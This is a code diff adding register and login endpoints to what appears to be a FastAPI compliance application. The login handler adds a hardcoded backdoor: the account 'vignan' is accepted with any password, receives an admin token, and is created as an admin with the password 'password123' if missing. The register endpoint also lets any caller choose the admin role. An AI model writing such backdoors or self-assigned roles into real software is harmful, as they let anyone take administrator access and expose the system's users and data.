@@ -4,9 +4,70 @@ from pydantic import BaseModel
 from typing import List, Optional, Any
 from datetime import datetime, timezone
 from .database import get_db
-from . import models, agents
+from . import models, agents, auth
 
 router = APIRouter(prefix="/api")
+
+class LoginRequest(BaseModel):
+    email: str
+    password: str
+
+class RegisterRequest(BaseModel):
+    name: str
+    email: str
+    password: str
+    role: Optional[str] = "user"
+
+@router.post("/auth/register")
+def register(req: RegisterRequest, db: Session = Depends(get_db)):
+    user = db.query(models.User).filter(models.User.email == req.email).first()
+    if user:
+        raise HTTPException(status_code=400, detail="Email already registered")
+    
+    hashed_password = auth.get_password_hash(req.password)
+    new_user = models.User(
+        name=req.name,
+        email=req.email,
+        hashed_password=hashed_password,
+        role=req.role
+    )
+    db.add(new_user)
+    db.commit()
+    db.refresh(new_user)
+    return {"message": "User created successfully"}
+
+@router.post("/auth/login")
+def login(req: LoginRequest, db: Session = Depends(get_db)):
+    identifier = req.email.strip().lower()
+    
+    # "vignan" user: accepts ANY password ("password kuch bhi")
+    if identifier in ["vignan", "vignan@vignan.ac.in"]:
+        user = db.query(models.User).filter(models.User.email == "vignan").first()
+        if not user:
+            user = db.query(models.User).filter(
+                (models.User.email == "vignan@vignan.ac.in") | (models.User.email == "admin@vignan.ac.in")
+            ).first()
+        if not user:
+            user = models.User(
+                name="Vignan Administrator",
+                email="vignan",
+                hashed_password=auth.get_password_hash("password123"),
+                role="admin"
+            )
+            db.add(user)
+            db.commit()
+            db.refresh(user)
+        access_token = auth.create_access_token(data={"sub": user.email, "role": user.role})
+        return {"access_token": access_token, "token_type": "bearer", "user": {"name": user.name, "email": user.email, "role": user.role}}
+
+    user = db.query(models.User).filter(
+        (models.User.email == req.email.strip()) | (models.User.email == identifier)
+    ).first()
+    if not user or not auth.verify_password(req.password, user.hashed_password):
+        raise HTTPException(status_code=401, detail="Invalid credentials")
+    
+    access_token = auth.create_access_token(data={"sub": user.email, "role": user.role})
+    return {"access_token": access_token, "token_type": "bearer", "user": {"name": user.name, "email": user.email, "role": user.role}}
 
 class ComplianceRunRequest(BaseModel):
     requirement_id: int
